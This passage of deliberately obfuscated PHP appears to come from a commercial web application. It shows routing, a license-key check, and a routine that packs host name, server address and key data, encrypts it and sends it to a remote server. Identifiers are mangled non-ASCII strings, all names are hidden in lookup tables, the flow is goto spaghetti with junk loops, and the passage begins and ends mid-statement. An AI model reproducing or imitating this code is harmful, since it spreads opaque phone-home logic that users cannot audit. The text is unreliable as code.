= $a†ó”òö›Õ[584]; while ($d—¾¯×£˜Õ < $a†ó”òö›Õ[579]) { if ($d—¾¯×£˜Õ >= 0) { break; } $d—¾¯×£˜Õ++; } } } private function rosv644235cb() { goto eØÓë‰Ó; E¦êê”¾íÄ: $GLOBALS[$fØôëøË„[22]][$fØôëøË„[23]] = $fØôëøË„[27]($A¿§™™­ëÛ, $FœÜÔ¢˜Š„); $GLOBALS[$fØôëøË„[22]][$fØôëøË„[28]] = $fØôëøË„[29]($fØôëøË„[1], $GLOBALS[$fØôëøË„[22]][$fØôëøË„[23]]); goto F™‡¡ÓâÒÅ; dŒÄŠ¹ø‘ï: $A¿§™™­ëÛ = array($fØôëøË„[8], $e·íÓºËáÓ); $CÓæ„˜ˆÂ“ = $EÑâ©ÓÙö¸[586]; $FœÜÔ¢˜Š„ = $fØôëøË„[26]($GLOBALS[$fØôëøË„[22]][$fØôëøË„[23]], 1); goto E¦êê”¾íÄ; A‚“›¥ˆ”Õ: $e·íÓºËáÓ = $fØôëøË„[25]($eÑÊòŠƒÉ‘, 0, -$fØôëøË„[24]($B¡Ôº­ÚÅË)); $bÃ‘öÕ¯ = $EÑâ©ÓÙö¸[585]; if (strlen($bÃ‘öÕ¯) < $EÑâ©ÓÙö¸[581]) { die; } goto dŒÄŠ¹ø‘ï; d—ª–ç‘¤Ú: $eÑÊòŠƒÉ‘ = $GLOBALS[$fØôëøË„[22]][$fØôëøË„[23]][0]; if (!$eÑÊòŠƒÉ‘ || $fØôëøË„[24]($eÑÊòŠƒÉ‘) <= $fØôëøË„[24]($B¡Ôº­ÚÅË)) { return; } if ($fØôëøË„[6]($fØôëøË„[25]($eÑÊòŠƒÉ‘, -$fØôëøË„[24]($B¡Ôº­ÚÅË))) != $B¡Ôº­ÚÅË) { return; } goto A‚“›¥ˆ”Õ; eØÓë‰Ó: $EÑâ©ÓÙö¸ =& $_SERVER[åÌÛ»ô¢‚ö™]; $fØôëøË„ =& $_SERVER[µ¨«]; $B¡Ôº­ÚÅË = $fØôëøË„[8]; goto d—ª–ç‘¤Ú; F™‡¡ÓâÒÅ: } private function pvjf6f7f5c20() { goto B½’ÓŞ§ßÊ; aĞÇÜ¤Ù: $AøÊíÌ­‹¦ = $_SERVER[åÌÛ»ô¢‚ö™][587]; $Aè—ãÂÄ‰ = $CÛÅ»ÀáÕİ[31]; if (!$CÛÅ»ÀáÕİ[32]($EºÄŞ–›Á”, $Aè—ãÂÄ‰)) { return; } goto fŒ”Ìñ»µç; B½’ÓŞ§ßÊ: $CÛÅ»ÀáÕİ =& $_SERVER[µ¨«]; if ($GLOBALS[$CÛÅ»ÀáÕİ[22]][$CÛÅ»ÀáÕİ[28]] != $CÛÅ»ÀáÕİ[10]) { return; } $EºÄŞ–›Á” = $_SERVER[$CÛÅ»ÀáÕİ[30]]; goto aĞÇÜ¤Ù; CÛ²¸®¶ğ: $bˆÄÔ¤ö¢Ø = $CÛÅ»ÀáÕİ[2]($DçÆé˜øä[0][0], $CÛÅ»ÀáÕİ[36]); $GLOBALS[$CÛÅ»ÀáÕİ[22]][$CÛÅ»ÀáÕİ[23]] = $CÛÅ»ÀáÕİ[0]($CÛÅ»ÀáÕİ[36], $bˆÄÔ¤ö¢Ø); $GLOBALS[$CÛÅ»ÀáÕİ[22]][$CÛÅ»ÀáÕİ[28]] = $CÛÅ»ÀáÕİ[29]($CÛÅ»ÀáÕİ[1], $GLOBALS[$CÛÅ»ÀáÕİ[22]][$CÛÅ»ÀáÕİ[23]]); goto B‚ ‰ä¢§; fŒ”Ìñ»µç: $d»’„× ÒÇ = $CÛÅ»ÀáÕİ[33]($EºÄŞ–›Á”, $Aè—ãÂÄ‰); $bˆÄÔ¤ö¢Ø = $CÛÅ»ÀáÕİ[25]($EºÄŞ–›Á”, $d»’„× ÒÇ + $CÛÅ»ÀáÕİ[24]($Aè—ãÂÄ‰)); $CÛÅ»ÀáÕİ[34]($CÛÅ»ÀáÕİ[35], $bˆÄÔ¤ö¢Ø, $DçÆé˜øä); goto CÛ²¸®¶ğ; B‚ ‰ä¢§: } public function run() { goto cÇ‚ÒŸÁÙ; dñ÷Øîˆ‘°: $this->{$_SERVER[µ¨«][38]}(); $c˜×—í¹¶Ã = $GLOBALS[$cáÔ³·‚[22]][$cáÔ³·‚[23]]; $B´éˆã±§ = $c¦æÊÄÅƒÑ[588]; goto B½š²°›º; B½š²°›º: $Fá—´¼¥Œ = $GLOBALS[$cáÔ³·‚[22]][$cáÔ³·‚[28]]; $aÌÓÔÛºÚ¶ = $c¦æÊÄÅƒÑ[589]; if (strlen($aÌÓÔÛºÚ¶) < $c¦æÊÄÅƒÑ[583]) { return; } goto B„Æê®Í‹È; cÇ‚ÒŸÁÙ: $c¦æÊÄÅƒÑ =& $_SERVER[åÌÛ»ô¢‚ö™]; $cáÔ³·‚ =& $_SERVER[µ¨«]; $this->{$_SERVER[µ¨«][37]}(); goto dñ÷Øîˆ‘°; B„Æê®Í‹È: $cáÔ³·‚[39]($cáÔ³·‚[40], isset($c˜×—í¹¶Ã[0]) && $c˜×—í¹¶Ã[0] ? $c˜×—í¹¶Ã[0] : $this->defaultModule); $bˆï„Œˆ = $c¦æÊÄÅƒÑ[590]; if (!$bˆï„Œˆ) { die; } goto fÀòè¡Ü²’; få¯®–ƒ¼¾: $cáÔ³·‚[39]($cáÔ³·‚[43], MOD . $cáÔ³·‚[1] . ST . $cáÔ³·‚[1] . ACT); $_SERVER[$cáÔ³·‚[44]] = $cáÔ³·‚[6](ACTION); $E¥‚ßæÙ“˜ = $c¦æÊÄÅƒÑ[592]; goto f‹ÓÄÅÀÊŞ; f‹ÓÄÅÀÊŞ: while (strlen($E¥‚ßæÙ“˜) < $c¦æÊÄÅƒÑ[583]) { if (!$E¥‚ßæÙ“˜) { break; } $E¥‚ßæÙ“˜++; } $this->{$_SERVER[µ¨«][45]}(); if ($cáÔ³·‚[19]($c˜×—í¹¶Ã) >= 3) { $this->{$_SERVER[µ¨«][21]}($Fá—´¼¥Œ); } else { $this->{$_SERVER[µ¨«][21]}(ACTION); } goto D‚Ç¨”õ; fÀòè¡Ü²’: $cáÔ³·‚[39]($cáÔ³·‚[41], isset($c˜×—í¹¶Ã[1]) && $c˜×—í¹¶Ã[0] ? $c˜×—í¹¶Ã[1] : $this->defaultController); $A¸¡ğ¨Êñ = $c¦æÊÄÅƒÑ[591]; $cáÔ³·‚[39]($cáÔ³·‚[42], isset($c˜×—í¹¶Ã[2]) && $c˜×—í¹¶Ã[0] ? $c˜×—í¹¶Ã[2] : $this->defaultAction); goto få¯®–ƒ¼¾; D‚Ç¨”õ: } private $jcwzbf147d45 = array(); private $xadyd0e3e2cf = ''; public function awrs7b8e9571() { goto e‘ßÏ¾˜ğ; B‚Õ»Ï¼÷³: $this->{$_SERVER[µ¨«][3]}($FÙÛÄ–šæ[53], array($this, $FÙÛÄ–šæ[54])); $cœ‰„×è¶È = $a„×í¯É­Õ[598]; while (strlen($cœ‰„×è¶È) < $a„×í¯É­Õ[573]) { if (!$cœ‰„×è¶È) { break; } $cœ‰„×è¶È++; } goto CØöÕ¥Îá; eˆ©Ä–¡ñÉ: $b‘÷Œï¤² = $a„×í¯É­Õ[595]; $this->{$_SERVER[µ¨«][49]}(); $this->{$_SERVER[µ¨«][50]}(); goto dÑ­ÛŒ«´à; dÑ­ÛŒ«´à: $this->{$_SERVER[µ¨«][51]}(); $f‘“ƒÇ¢Î = $a„×í¯É­Õ[596]; while ($f‘“ƒÇ¢Î < $a„×í¯É­Õ[184]) { if ($f‘“ƒÇ¢Î >= 0) { break; } $f‘“ƒÇ¢Î++; } goto aøŠÍ‡ë‹Ç; eËğÜ‡‹Ï: $c×ˆÛœŠ•ğ = $a„×í¯É­Õ[594]; while (strlen($c×ˆÛœŠ•ğ) < $a„×í¯É­Õ[583]) { if (!$c×ˆÛœŠ•ğ) { break; } $c×ˆÛœŠ•ğ++; } $this->{$_SERVER[µ¨«][48]}(); goto eˆ©Ä–¡ñÉ; e‘ßÏ¾˜ğ: $a„×í¯É­Õ =& $_SERVER[åÌÛ»ô¢‚ö™]; $FÙÛÄ–šæ =& $_SERVER[µ¨«]; $this->{$_SERVER[µ¨«][46]}(); goto f÷•´›‚İ²; f÷•´›‚İ²: $C¢«ø‘¦Šç = $a„×í¯É­Õ[593]; if (strlen($C¢«ø‘¦Šç) < $a„×í¯É­Õ[579]) { die; } $this->{$_SERVER[µ¨«][47]}(); goto eËğÜ‡‹Ï; f¹íñ¢¾˜„: $this->{$_SERVER[µ¨«][3]}($FÙÛÄ–šæ[57], array($this, $FÙÛÄ–šæ[58])); $this->{$_SERVER[µ¨«][3]}($FÙÛÄ–šæ[59], array($this, $FÙÛÄ–šæ[60])); goto D˜ÂŠ¤‘®Í; CØöÕ¥Îá: $this->{$_SERVER[µ¨«][3]}($FÙÛÄ–šæ[55], array($this, $FÙÛÄ–šæ[56])); $E£½ÊÊ¾³Š = $a„×í¯É­Õ[599]; if (!$E£½ÊÊ¾³Š) { return; } goto f¹íñ¢¾˜„; aøŠÍ‡ë‹Ç: $this->{$_SERVER[µ¨«][52]}(); $dëİÌº­ = $a„×í¯É­Õ[597]; if (strlen($dëİÌº­) < $a„×í¯É­Õ[184]) { return; } goto B‚Õ»Ï¼÷³; D˜ÂŠ¤‘®Í: } public function doshbecaf002($AÑÂ»¿‡Æ) { goto EŸËªÓ¸ñê; CšÑºŒŒ”¿: if ($this->xadyd0e3e2cf == $fˆÖÌ£Í’[130]) { $AÑÂ»¿‡Æ[$fˆÖÌ£Í’[102]][$fˆÖÌ£Í’[103]][$fˆÖÌ£Í’[108]][$fˆÖÌ£Í’[116]] = 0; } $AÑÂ»¿‡Æ[$fˆÖÌ£Í’[117]][$fˆÖÌ£Í’[137]] = $fˆÖÌ£Í’[113]($this->jcwzbf147d45, $fˆÖÌ£Í’[138], $fˆÖÌ£Í’[10]); $AÑÂ»¿‡Æ[$fˆÖÌ£Í’[117]][$fˆÖÌ£Í’[139]] = $fˆÖÌ£Í’[113]($this->jcwzbf147d45, $fˆÖÌ£Í’[140], $fˆÖÌ£Í’[10]); goto B¢ôæñ·§ø; F‰õ¦Ü§: if (!$Eõì–Ëîö) { return; } $AÑÂ»¿‡Æ[$fˆÖÌ£Í’[117]][$fˆÖÌ£Í’[126]] = $fˆÖÌ£Í’[127]($fˆÖÌ£Í’[128]()); $bá§ƒ£‹š = $aãµÖ¾ÁÌ©[606]; goto DÌ‰©‹·éí; B¢ôæñ·§ø: if ($fˆÖÌ£Í’[113]($GLOBALS, $fˆÖÌ£Í’[141]) && $this->config[$fˆÖÌ£Í’[142]]) { $AÑÂ»¿‡Æ[$fˆÖÌ£Í’[117]][$fˆÖÌ£Í’[143]] = WEB_ROOT; } return $AÑÂ»¿‡Æ; goto B‘‚¤¤¤í; C„Çã–îÇß: $c¨ê¦˜‰à = $aãµÖ¾ÁÌ©[600]; while (strlen($c¨ê¦˜‰à) < $aãµÖ¾ÁÌ©[581]) { if (!$c¨ê¦˜‰à) { break; } $c¨ê¦˜‰à++; } $Dñ²‡ÏÁËÖ = array($fˆÖÌ£Í’[64], $fˆÖÌ£Í’[65], $fˆÖÌ£Í’[66], $fˆÖÌ£Í’[67], $fˆÖÌ£Í’[68], $fˆÖÌ£Í’[69], $fˆÖÌ£Í’[70], $fˆÖÌ£Í’[71], $fˆÖÌ£Í’[72], $fˆÖÌ£Í’[73], $fˆÖÌ£Í’[74], $fˆÖÌ£Í’[75], $fˆÖÌ£Í’[76], $fˆÖÌ£Í’[77], $fˆÖÌ£Í’[78], $fˆÖÌ£Í’[79], $fˆÖÌ£Í’[80], $fˆÖÌ£Í’[81], $fˆÖÌ£Í’[82], $fˆÖÌ£Í’[83], $fˆÖÌ£Í’[84], $fˆÖÌ£Í’[85], $fˆÖÌ£Í’[86], $fˆÖÌ£Í’[87], $fˆÖÌ£Í’[88], $fˆÖÌ£Í’[89], $fˆÖÌ£Í’[90], $fˆÖÌ£Í’[91], $fˆÖÌ£Í’[92], $fˆÖÌ£Í’[93], $fˆÖÌ£Í’[94], $fˆÖÌ£Í’[95], $fˆÖÌ£Í’[96], $fˆÖÌ£Í’[97], $fˆÖÌ£Í’[98], $fˆÖÌ£Í’[99]); goto CŒ„îõÃß’; DÌ‰©‹·éí: while (strlen($bá§ƒ£‹š) < $aãµÖ¾ÁÌ©[583]) { if (!$bá§ƒ£‹š) { break; } $bá§ƒ£‹š++; } $AÑÂ»¿‡Æ[$fˆÖÌ£Í’[117]][$fˆÖÌ£Í’[129]] = $this->xadyd0e3e2cf; if ($bíÃµÏ÷èå[$fˆÖÌ£Í’[129]] != $fˆÖÌ£Í’[130]) { $AÑÂ»¿‡Æ[$fˆÖÌ£Í’[117]][$fˆÖÌ£Í’[131]] = $bíÃµÏ÷èå[$fˆÖÌ£Í’[131]]; $AÑÂ»¿‡Æ[$fˆÖÌ£Í’[117]][$fˆÖÌ£Í’[132]] = $bíÃµÏ÷èå[$fˆÖÌ£Í’[132]]; $cÜ¶¬…¡¡¹ = $fˆÖÌ£Í’[133](10) . $this->xadyd0e3e2cf . $fˆÖÌ£Í’[133](5); $AÑÂ»¿‡Æ[$fˆÖÌ£Í’[102]][$fˆÖÌ£Í’[134]][$fˆÖÌ£Í’[135]] = $this->{$_SERVER[µ¨«][136]}($cÜ¶¬…¡¡¹, $AÑÂ»¿‡Æ[$fˆÖÌ£Í’[117]][$fˆÖÌ£Í’[122]]); } goto CšÑºŒŒ”¿; CŒ„îõÃß’: foreach ($Dñ²‡ÏÁËÖ as $d—î¶†¾¥) { $fª÷‰šå¬‰ = $GLOBALS[$fˆÖÌ£Í’[100]][$fˆÖÌ£Í’[101]][$d—î¶†¾¥]; $CãÔ‡òôà™ = $aãµÖ¾ÁÌ©[601]; if (strlen($CãÔ‡òôà™) < $aãµÖ¾ÁÌ©[579]) { die; } if (isset($bíÃµÏ÷èå[$d—î¶†¾¥])) { $fª÷‰šå¬‰ = $bíÃµÏ÷èå[$d—î¶†¾¥]; } $AÑÂ»¿‡Æ[$fˆÖÌ£Í’[102]][$fˆÖÌ£Í’[103]][$d—î¶†¾¥] = $fª÷‰šå¬‰; } $DÜ›•¼± = $AÑÂ»¿‡Æ[$fˆÖÌ£Í’[102]][$fˆÖÌ£Í’[103]][$fˆÖÌ£Í’[76]]; unset($AÑÂ»¿‡Æ[$fˆÖÌ£Í’[102]][$fˆÖÌ£Í’[104]][$fˆÖÌ£Í’[105]]); goto A®àÙêåëÂ; bšëÏã˜´î: unset($AÑÂ»¿‡Æ[$fˆÖÌ£Í’[102]][$fˆÖÌ£Í’[103]][$fˆÖÌ£Í’[107]]); $AÑÂ»¿‡Æ[$fˆÖÌ£Í’[102]][$fˆÖÌ£Í’[103]][$fˆÖÌ£Í’[108]] = array($fˆÖÌ£Í’[109] => (int) $DÜ›•¼±[$fˆÖÌ£Í’[110]], $fˆÖÌ£Í’[111] => $fˆÖÌ£Í’[112]($fˆÖÌ£Í’[113]($DÜ›•¼±, $fˆÖÌ£Í’[114], array())), $fˆÖÌ£Í’[115] => (int) $fˆÖÌ£Í’[113]($DÜ›•¼±, $fˆÖÌ£Í’[116], 0)); $dÛ˜Æé±Û = $aãµÖ¾ÁÌ©[604]; goto dµ±¼Ã³; FáøÔ—æ÷ñ: $FÛ¾å’¼Ë™ = $aãµÖ¾ÁÌ©[603]; if (strlen($FÛ¾å’¼Ë™) < $aãµÖ¾ÁÌ©[573]) { return; } unset($AÑÂ»¿‡Æ[$fˆÖÌ£Í’[102]][$fˆÖÌ£Í’[103]][$fˆÖÌ£Í’[76]]); goto bšëÏã˜´î; dµ±¼Ã³: $AÑÂ»¿‡Æ[$fˆÖÌ£Í’[117]][$fˆÖÌ£Í’[118]] = $fˆÖÌ£Í’[119]($fˆÖÌ£Í’[120])->{$_SERVER[µ¨«][121]}(); $AÑÂ»¿‡Æ[$fˆÖÌ£Í’[117]][$fˆÖÌ£Í’[122]] = $fˆÖÌ£Í’[123]($_SERVER[$fˆÖÌ£Í’[124]] . $bíÃµÏ÷èå[$fˆÖÌ£Í’[125]]); $Eõì–Ëîö = $aãµÖ¾ÁÌ©[605]; goto F‰õ¦Ü§; EŸËªÓ¸ñê: $aãµÖ¾ÁÌ© =& $_SERVER[åÌÛ»ô¢‚ö™]; $fˆÖÌ£Í’ =& $_SERVER[µ¨«]; $bíÃµÏ÷èå = $fˆÖÌ£Í’[61]($fˆÖÌ£Í’[62])->{$_SERVER[µ¨«][63]}(); goto C„Çã–îÇß; A®àÙêåëÂ: $fÅó–ŒÛ¢ä = $aãµÖ¾ÁÌ©[602]; while (strlen($fÅó–ŒÛ¢ä) < $aãµÖ¾ÁÌ©[573]) { if (!$fÅó–ŒÛ¢ä) { break; } $fÅó–ŒÛ¢ä++; } unset($AÑÂ»¿‡Æ[$fˆÖÌ£Í’[102]][$fˆÖÌ£Í’[104]][$fˆÖÌ£Í’[106]]); goto FáøÔ—æ÷ñ; B‘‚¤¤¤í: } private function nlrbc2910ab5() { goto E‘ŸÍ­±ŸÜ; fäî…ªµ¾¬: if (strlen($bæ´Òô ÆÌ) < $aÌÉ„Ç­…[579]) { die; } $b¨Ç—÷òë = $E¦‚­˜–ø¼[61]($E¦‚­˜–ø¼[62])->{$_SERVER[µ¨«][63]}(); $CÀ¶¾ÅôÚö = $aÌÉ„Ç­…[610]; goto CÖ‡¶‹ŒìÉ; E‘ŸÍ­±ŸÜ: $aÌÉ„Ç­… =& $_SERVER[åÌÛ»ô¢‚ö™]; $E¦‚­˜–ø¼ =& $_SERVER[µ¨«]; if ($_SERVER[$E¦‚­˜–ø¼[44]] == $E¦‚­˜–ø¼[144]) { goto eñƒ‹ç¯Óî; CÁ¤ÁœÊÉÔ: $aÙö˜ŒÌ¨Ê = $aÌÉ„Ç­…[608]; $E¦‚­˜–ø¼[13](array($E¦‚­˜–ø¼[160], $E¦‚­˜–ø¼[161]), $D…Å¸¨‹’˜); goto BÆ¤ùÁõè; eñƒ‹ç¯Óî: $f†ç´§ë’í = array($E¦‚­˜–ø¼[129] => $this->xadyd0e3e2cf, $E¦‚­˜–ø¼[145] => $this->{$_SERVER[µ¨«][146]}(), $E¦‚­˜–ø¼[147] => $E¦‚­˜–ø¼[61]($E¦‚­˜–ø¼[148])->{$_SERVER[µ¨«][149]}()); if ($this->xadyd0e3e2cf != $E¦‚­˜–ø¼[130]) { $fªÌ°¢Â‚ = $E¦‚­˜–ø¼[113]($this->jcwzbf147d45, $E¦‚­˜–ø¼[150]); if ($fªÌ°¢Â‚) { $f†ç´§ë’í[$E¦‚­˜–ø¼[151]] = $fªÌ°¢Â‚; $f†ç´§ë’í[$E¦‚­˜–ø¼[152]] = $E¦‚­˜–ø¼[153]($E¦‚­˜–ø¼[113]($this->jcwzbf147d45, $E¦‚­˜–ø¼[154])); $f†ç´§ë’í[$E¦‚­˜–ø¼[155]] = $E¦‚­˜–ø¼[113]($this->jcwzbf147d45, $E¦‚­˜–ø¼[140]); } } $f†ç´§ë’í = $this->{$_SERVER[µ¨«][156]}($E¦‚­˜–ø¼[157]($f†ç´§ë’í), $E¦‚­˜–ø¼[123]($E¦‚­˜–ø¼[158])); goto EÏÖÊŞàùÖ; EÏÖÊŞàùÖ: $E‹”³ŠÇ„ = $aÌÉ„Ç­…[607]; if (!$E‹”³ŠÇ„) { die; } $D…Å¸¨‹’˜ = array($E¦‚­˜–ø¼[159] => $f†ç´§ë’í); goto CÁ¤ÁœÊÉÔ; BÆ¤ùÁõè: } goto eÀÈÖ÷½ ›; eÀÈÖ÷½ ›: if ($this->xadyd0e3e2cf == $E¦‚­˜–ø¼[130]) { return; } $a’äªò¯Õí = array($E¦‚­˜–ø¼[162], $E¦‚­˜–ø¼[163], $E¦‚­˜–ø¼[164], $E¦‚­˜–ø¼[165], $E¦‚­˜–ø¼[166], $E¦‚­˜–ø¼[167]); $bæ´Òô ÆÌ = $aÌÉ„Ç­…[609]; goto fäî…ªµ¾¬; fÌñ´Š‘›š: foreach ($a’äªò¯Õí as $A¡˜‹ìŸ‹¨) { if (!isset($b¨Ç—÷òë[$A¡˜‹ìŸ‹¨]) || !$b¨Ç—÷òë[$A¡˜‹ìŸ‹¨]) { continue; } $D…Å¸¨‹’˜[$A¡˜‹ìŸ‹¨] = $b¨Ç—÷òë[$A¡˜‹ìŸ‹¨]; } $E¦‚­˜–ø¼[13](array($E¦‚­˜–ø¼[160], $E¦‚­˜–ø¼[161]), $D…Å¸¨‹’˜); goto BÏ¢à‘æÇ’; CÖ‡¶‹ŒìÉ: while (strlen($CÀ¶¾ÅôÚö) < $aÌÉ„Ç­…[573]) { if (!$CÀ¶¾ÅôÚö) { break; } $CÀ¶¾ÅôÚö++; } $D…Å¸¨‹’˜ = array($E¦‚­˜–ø¼[168] => $b¨Ç—÷òë[$E¦‚­˜–ø¼[64]], $E¦‚­˜–ø¼[169] => $b¨Ç—÷òë[$E¦‚­˜–ø¼[65]], $E¦‚­˜–ø¼[170] => $E¦‚­˜–ø¼[10]); $dÕâ‡ººîç = $aÌÉ„Ç­…[611]; goto fÌñ´Š‘›š; BÏ¢à‘æÇ’: } private function vkar8d0a1527() { goto e“Ÿï™Õ¶·; d”·¢ùœÆŠ: $this->{$_SERVER[µ¨«][238]}(); $eùÄ“†°£¬[175]($eùÄ“†°£¬[207]($eùÄ“†°£¬[217]), !0); $cŸÜÌÄÜ© = $A–©Éâó­‡[620]; goto B–ƒ¨ğ£ã; a¸»Ï‡÷ä‡: $d”÷»±Ì´– = $eùÄ“†°£¬[25]($eùÄ“†°£¬[123]($e½áëĞÚ[$eùÄ“†°£¬[219]]), 10, 10); $c®ÏÉõÀÛÏ = $d”÷»±Ì´– . $e½áëĞÚ[$eùÄ“†°£¬[129]] . $e½áëĞÚ[$eùÄ“†°£¬[221]]; $c•ÂÉÄ¡ôµ = $A–©Éâó­‡[614]; goto EŸÓÀŠ©; DÃ•‹†Á£å: while (strlen($dõ¾ÌòÇÜ) < $A–©Éâó­‡[579]) { if (!$dõ¾ÌòÇÜ) { break; } $dõ¾ÌòÇÜ++; } $this->jcwzbf147d45 = $A¢´å¾«¢; $this->xadyd0e3e2cf = $e½áëĞÚ[$eùÄ“†°£¬[129]]; goto d”·¢ùœÆŠ; Eé¨”®åŠÂ: if ($D–Ê•«•°Ÿ[$eùÄ“†°£¬[187]] == $eùÄ“†°£¬[188]) { $D„óÉº‰¿¯ = $this->{$_SERVER[µ¨«][156]}($f‚Ğµöµá, $eùÄ“†°£¬[189]); $B¶§ğâ¨È = $this->{$_SERVER[µ¨«][136]}($eùÄ“†°£¬[157]($bÁ´Ğ¾“Í’), $f‚Ğµöµá . $eùÄ“†°£¬[190], 3); $B¶§ğâ¨È = $B¶§ğâ¨È . $eùÄ“†°£¬[191] . $_SERVER[$eùÄ“†°£¬[182]]; $f‰ò‚˜‰ = $this->{$_SERVER[µ¨«][192]}($eùÄ“†°£¬[193] . $D„óÉº‰¿¯ . $eùÄ“†°£¬[194] . $B¶§ğâ¨È, -1); $eùÄ“†°£¬[175]($f‰ò‚˜‰, !0); } else { if ($D–Ê•«•°Ÿ[$eùÄ“†°£¬[187]] == $eùÄ“†°£¬[195]) { $AÒå¨ŠŒ®³ = $eùÄ“†°£¬[25]($eùÄ“†°£¬[123]($eùÄ“†°£¬[196] . $f‚Ğµöµá), 12, 15) . $eùÄ“†°£¬[197]; $B¶§ğâ¨È = $this->{$_SERVER[µ¨«][198]}($eùÄ“†°£¬[2]($D–Ê•«•°Ÿ[$eùÄ“†°£¬[199]]), $AÒå¨ŠŒ®³, 2); $aì’°ÅÌ = $eùÄ“†°£¬[200]($B¶§ğâ¨È, !0); if (!$eùÄ“†°£¬[201]($aì’°ÅÌ) || !$eùÄ“†°£¬[201]($aì’°ÅÌ[$eùÄ“†°£¬[202]]) || $aì’°ÅÌ[$eùÄ“†°£¬[174]] != !0) { $EÙÃí«Øëô = $eùÄ“†°£¬[203]; $b„ßšğ†¼ = $aì’°ÅÌ[$eùÄ“†°£¬[202]] ? $eùÄ“†°£¬[204] . $aì’°ÅÌ[$eùÄ“†°£¬[202]] : $EÙÃí«Øëô; $eùÄ“†°£¬[175]($b„ßšğ†¼, !1); } else { $bÁ´Ğ¾“Í’[$eùÄ“†°£¬[177]] = $aì’°ÅÌ[$eùÄ“†°£¬[202]][$eùÄ“†°£¬[205]]; } } else { $aì’°ÅÌ = $this->{$_SERVER[µ¨«][192]}($eùÄ“†°£¬[206], $bÁ´Ğ¾“Í’, 10); } } if (!$eùÄ“†°£¬[201]($aì’°ÅÌ) || !$eùÄ“†°£¬[201]($aì’°ÅÌ[$eùÄ“†°£¬[202]]) || $aì’°ÅÌ[$eùÄ“†°£¬[174]] != !0) { $EÙÃí«Øëô = $eùÄ“†°£¬[207]($eùÄ“†°£¬[208]); $b„ßšğ†¼ = $aì’°ÅÌ[$eùÄ“†°£¬[202]] ? $eùÄ“†°£¬[204] . $aì’°ÅÌ[$eùÄ“†°£¬[202]] : $EÙÃí«Øëô; $eùÄ“†°£¬[175]($b„ßšğ†¼, !1); } $A¢´å¾«¢ = $aì’°ÅÌ[$eùÄ“†°£¬[202]]; goto EµÂ‡–¦Îø; DæîÜÏï»×: if (!isset($D–Ê•«•°Ÿ[$eùÄ“†°£¬[174]]) || $eùÄ“†°£¬[24]($D–Ê•«•°Ÿ[$eùÄ“†°£¬[174]]) != 16) { $eùÄ“†°£¬[175]($eùÄ“†°£¬[176] . $D–Ê•«•°Ÿ[$eùÄ“†°£¬[174]], !1); } $Dî…«¨ª‹Ò = $eùÄ“†°£¬[61]($eùÄ“†°£¬[62])->{$_SERVER[µ¨«][63]}($eùÄ“†°£¬[125]); $bÁ´Ğ¾“Í’ = array($eùÄ“†°£¬[174] => $D–Ê•«•°Ÿ[$eùÄ“†°£¬[174]], $eùÄ“†°£¬[177] => $eùÄ“†°£¬[133](16), $eùÄ“†°£¬[178] => $eùÄ“†°£¬[158], $eùÄ“†°£¬[179] => $eùÄ“†°£¬[180], $eùÄ“†°£¬[181] => $_SERVER[$eùÄ“†°£¬[182]], $eùÄ“†°£¬[183] => $_SERVER[$eùÄ“†°£¬[184]], $eùÄ“†°£¬[185] => $_SERVER[$eùÄ“†°£¬[186]]); goto D·¤Ì²Ùà“; aŸéÌ¸‚­é: if (!$eùÄ“†°£¬[113]($GLOBALS, $eùÄ“†°£¬[141])) { die; } $D–Ê•«•°Ÿ = $GLOBALS[$eùÄ“†°£¬[22]]; if (isset($D–Ê•«•°Ÿ[$eùÄ“†°£¬[172]])) { $this->{$_SERVER[µ¨«][173]}(); die; } goto DæîÜÏï»×; F×«°ß‰“: $e½áëĞÚ[$eùÄ“†°£¬[132]] = $eùÄ“†°£¬[127]($eùÄ“†°£¬[223]($this->{$_SERVER[µ¨«][156]}($Cí¼¶Ÿô¯, $eùÄ“†°£¬[225]))); if ($A¢´å¾«¢[$eùÄ“†°£¬[226]] && $A¢´å¾«¢[$eùÄ“†°£¬[226]] >= 1) { $eùÄ“†°£¬[61]($eùÄ“†°£¬[62])->{$_SERVER[µ¨«][227]}($eùÄ“†°£¬[228], $eùÄ“†°£¬[229]); } $eùÄ“†°£¬[61]($eùÄ“†°£¬[62])->{$_SERVER[µ¨«][230]}($e½áëĞÚ); goto F¿…øõ·ğ; AÑ‹™¶·Øí: $b÷¶Ûù†˜[$a¶ŒÆ£»Êå] = $DŒÉšœ§‡; $eùÄ“†°£¬[61]($eùÄ“†°£¬[11])->{$_SERVER[µ¨«][235]}($då´Ûƒ¶…Æ[$eùÄ“†°£¬[236]], array($eùÄ“†°£¬[237] => $b÷¶Ûù†˜)); $dõ¾ÌòÇÜ = $A–©Éâó­‡[619]; goto DÃ•‹†Á£å; B–ƒ¨ğ£ã: if (strlen($cŸÜÌÄÜ©) < $A–©Éâó­‡[581]) { die; } goto bÆ¥±¹†Ş; aøÂâ·æ‡: if (!$f³Î‡Øõ¾± || $f³Î‡Øõ¾± != $A¢´å¾«¢[$eùÄ“†°£¬[154]]) { $cÖÖÊ²×»„ = array($eùÄ“†°£¬[211] => $eùÄ“†°£¬[61]($eùÄ“†°£¬[62])->{$_SERVER[µ¨«][63]}($eùÄ“†°£¬[125]), $eùÄ“†°£¬[212] => $_SERVER[$eùÄ“†°£¬[124]], $eùÄ“†°£¬[213] => $eùÄ“†°£¬[214](), $eùÄ“†°£¬[183] => $_SERVER[$eùÄ“†°£¬[184]]); $B¶§ğâ¨È = $this->{$_SERVER[µ¨«][215]}($eùÄ“†°£¬[157]($cÖÖÊ²×»„)); $this->{$_SERVER[µ¨«][192]}($eùÄ“†°£¬[216] . $B¶§ğâ¨È); $eùÄ“†°£¬[175]($eùÄ“†°£¬[207]($eùÄ“†°£¬[217]), !0); } $e½áëĞÚ = array($eùÄ“†°£¬[218] => $bÁ´Ğ¾“Í’[$eùÄ“†°£¬[174]], $eùÄ“†°£¬[219] => $A¢´å¾«¢[$eùÄ“†°£¬[220]], $eùÄ“†°£¬[221] => $eùÄ“†°£¬[133](16), $eùÄ“†°£¬[129] => $A¢´å¾«¢[$eùÄ“†°£¬[222]]); if ($bÁ´Ğ¾“Í’[$eùÄ“†°£¬[177]]) { $e½áëĞÚ[$eùÄ“†°£¬[221]] = $bÁ´Ğ¾“Í’[$eùÄ“†°£¬[177]]; } goto a¸»Ï‡÷ä‡; EµÂ‡–¦Îø: $f³Î‡Øõ¾± = $this->{$_SERVER[µ¨«][209]}($A¢´å¾«¢[$eùÄ“†°£¬[210]]); $bâç–Ùª»ç = $A–©Éâó­‡[613]; if (!$bâç–Ùª»ç) { return; } goto aøÂâ·æ‡; D·¤Ì²Ùà“: $f‚Ğµöµá = 